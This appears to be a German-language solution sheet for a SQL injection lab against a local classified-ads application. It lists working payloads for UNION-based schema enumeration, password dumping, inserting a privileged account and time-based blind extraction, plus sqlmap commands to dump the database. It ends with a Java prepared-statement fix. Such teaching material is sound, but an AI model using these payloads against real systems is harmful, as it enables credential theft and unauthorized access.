Aufgabe  1: ')--
Aufgabe  2: ') AND 1=2 --
Aufgabe  3: ') AND 1=2 UNION SELECT null,null,null,null,null,null,null FROM information_schema.tables WHERE table_schema='public‘ --
Aufgabe  4: ') AND 1=2 UNION SELECT null,null,'a',null,null,null,null FROM information_schema.tables WHERE table_schema='public'--
Aufgabe  5: ') AND 1=2 UNION SELECT null,null,(table_name || ' - ' || column_name),null,null,null,null FROM information_schema.columns WHERE table_schema='public'--
Aufgabe  6: ') AND 1=2 UNION SELECT null,null,(username || ' - ' || password),null,null,null,null FROM usr --
Aufgabe  7: '); INSERT INTO usr (id, username, password, authority_id) VALUES (1000, 'aaa', 'aaa', 2); --
Aufgabe  9: ' AND 1=(SELECT COUNT(*) FROM guessed_table) --
Aufgabe 10: ' AND known_table.guessed_column IS NULL –-
Wortlänge:  '; SELECT CASE WHEN (SELECT LENGTH(username) FROM usr FETCH FIRST 1 ROW ONLY)<6 THEN pg_sleep(4) ELSE null END --
Wort:       '; SELECT CASE WHEN (SELECT SUBSTR(username,1,1) FROM usr FETCH FIRST 1 ROW ONLY)='a' THEN pg_sleep(4) ELSE null END --
sqlmap 1:   python sqlmap.py -u http://localhost:8080/ads?s=b --dbs
sqlmap 2:   python sqlmap.py -u http://localhost:8080/ads?s=b -D database -–tables
sqlmap 3:   python sqlmap.py -u http://localhost:8080/ads?s=b -D database –T table --dump


Prepared Statements:
List<ClassifiedAd> ads = jdbcTemplate.query(
                new PreparedStatementCreator() {
                    String sql = "SELECT * FROM classified_ad " +
                            "WHERE " + UPPER_FN + "(title) LIKE " + UPPER_FN + "(?) " +
                            "ORDER BY createdtimestamp DESC";
                    @Override
                    public PreparedStatement createPreparedStatement(Connection con) throws SQLException {
                        PreparedStatement psm = con.prepareStatement(sql);
                        psm.setString(1,"%"+s+"%");
                        return psm;
                    }
                },
                new RowMapper<ClassifiedAd>() {
                    @Override
                    public ClassifiedAd mapRow(ResultSet rs, int rowNum) throws SQLException {
                        User owner = userRepository.findOne(rs.getLong("OWNER_ID"));
                        ClassifiedAd ad = new ClassifiedAd(
                                owner,
                                rs.getString("TITLE"),
                                rs.getString("DESCRIPTION"),
                                rs.getInt("PRICE"),
                                rs.getTimestamp("CREATEDTIMESTAMP"));
                        ad.setId(rs.getLong("ID"));
                        return ad;
                    }
                });
